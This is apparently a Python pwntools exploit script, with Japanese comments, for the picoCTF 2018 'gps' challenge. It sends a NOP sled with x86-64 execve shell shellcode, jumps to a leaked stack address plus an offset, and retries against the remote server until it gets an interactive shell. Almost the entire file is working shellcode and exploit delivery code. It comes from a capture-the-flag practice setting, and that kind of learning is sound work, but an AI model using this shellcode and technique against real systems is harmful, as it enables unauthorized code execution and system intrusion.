# coding: utf-8

# 1回目の入力が読み込まれるアドレスに近いアドレスを出力してくれるので、2回目の入力でそこに飛ばす
# 1回目の入力はShellcodeを送り込んでおく
# nopスレッドが4000byteくらい取れるので、出力されたアドレスに1000ほど足したアドレスにリターンすればだいたい成功する

from pwn import *
import time

e = ELF('./gps')
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

payload = '\x90' * (4000 - len(shellcode)) + shellcode

host = '2018shell3.picoctf.com'
port = 24627

# p = process('./gps')
for i in range(50):
    p = remote(host, port)
    # p = process('./gps')
    p.recvuntil('Current position: ')
    buffer_addr = int(p.recvline(), 16) + 1000

    print("guess address: 0x%08x" % buffer_addr)

    p.recvuntil('> ')
    p.sendline(payload)

    p.recvuntil('> ')
    p.sendline(hex(buffer_addr))

    try:
        p.sendline('ls')
        if 'flag' in p.recv(1048):
            p.interactive()
            break
    except Exception as e:
        continue
